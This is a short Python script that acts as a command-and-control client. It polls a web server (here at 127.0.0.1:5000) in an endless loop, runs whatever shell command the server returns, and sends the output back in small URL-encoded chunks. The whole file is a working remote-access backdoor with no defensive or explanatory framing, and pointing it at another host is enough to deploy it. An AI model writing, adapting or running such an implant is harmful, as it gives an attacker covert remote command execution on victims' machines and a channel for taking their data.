import subprocess
import requests
import re
import urllib.parse


def connectServer():
    subprocess.run(["clear"])
    uuid = subprocess.run(["cat","/proc/sys/kernel/random/boot_id"],stdout=subprocess.PIPE)
    processed = str(uuid.stdout)[2:38]
    res = requests.get('http://127.0.0.1:5000/cmd?id='+processed)
    response =str(res.text)
    print("At your service:"+ "\n")
    t = len('<p></p>')
    subprocess.run(["sleep", "3"])
    if len(response) > t:
        cmd = ''
        pre = 3
        su = len(response) - 4
        cmd = str(response[pre:su])

        # Run command sent from the server
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
        output_cmd = result.stdout.decode('utf-8')
        send_output = cmd + "\n" + output_cmd
        c = urllib.parse.quote(send_output)

        # Send into chunks in GET request
        for cmd_result in re.findall('.{1,60}', c):
            requests.get('http://127.0.0.1:5000/cmd?id=' + processed+'&r='+cmd_result)
        print("Result of the command: "+ cmd + " sent to the server" "\n")
        subprocess.run(["sleep", "3"])
        subprocess.run(["clear"])


while(True):
    connectServer()